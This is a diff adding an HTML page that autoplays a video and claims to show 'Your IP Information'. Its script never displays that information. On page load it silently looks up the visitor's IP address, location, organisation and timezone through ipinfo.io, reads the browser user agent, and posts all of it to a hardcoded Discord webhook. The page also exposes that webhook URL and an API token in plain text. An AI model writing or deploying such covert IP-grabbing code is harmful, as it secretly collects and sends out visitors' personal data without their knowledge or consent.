@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+ <video width="320" height="240" autoplay>
+  <source src="https://s3.ezgif.com/tmp/ezgif-3-969bb6ada7.mp4" type="video/mp4">
+  <source src="movie.ogg" type="video/ogg">
+
+</video> 
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f4f4f4;
+        }
+        #ip-info {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            font-size: 24px;
+        }
+        p {
+            font-size: 18px;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="ip-info">
+        <h1>Your IP Information</h1>
+        <p id="ip">Loading...</p>
+        <p id="location"></p>
+        <p id="org"></p>
+        <p id="asn"></p>
+        <p id="timezone"></p>
+        <p id="browser"></p>
+    </div>
+
+    <script>
+        async function fetchIPInfo() {
+            try {
+                const response = await fetch('https://ipinfo.io/json?token=7ddf3aa7a5b884');
+                const data = await response.json();
+
+                // Display IP info on the page
+               
+                // Get and display browser info
+                const browserInfo = getBrowserInfo();
+              
+
+                // Send IP info to Discord webhook
+                const webhookUrl = 'https://discord.com/api/webhooks/1260356378950897717/5UVvMbYwwSN-mckw0PoarZIYWORLXRe1A8723Y6ht0-kMh0sh5CmJz1YChOCOQm8NGqh';
+                const message = {
+                    content: `New visitor IP information:\nIP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}\nOrganization: ${data.org}\nASN: ${data.org.split(' ')[0]}\nTimezone: ${data.timezone}\nBrowser: ${browserInfo}`
+                };
+
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(message)
+                });
+
+            } catch (error) {
+                document.getElementById('ip-info').textContent = 'Looks like youve run into an error.';
+            }
+        }
+
+        function getBrowserInfo() {
+            const userAgent = navigator.userAgent;
+            let browserName = "Unknown";
+
+            if (userAgent.match(/chrome|chromium|crios/i)) {
+                browserName = "Chrome";
+            } else if (userAgent.match(/firefox|fxios/i)) {
+                browserName = "Firefox";
+            } else if (userAgent.match(/safari/i)) {
+                browserName = "Safari";
+            } else if (userAgent.match(/opr\//i)) {
+                browserName = "Opera";
+            } else if (userAgent.match(/edg/i)) {
+                browserName = "Edge";
+            } else if (userAgent.match(/msie|trident/i)) {
+                browserName = "Internet Explorer";
+            }
+
+            return browserName + ' ' + navigator.appVersion;
+        }
+
+        fetchIPInfo();
+    </script>
+</body>
+</html>
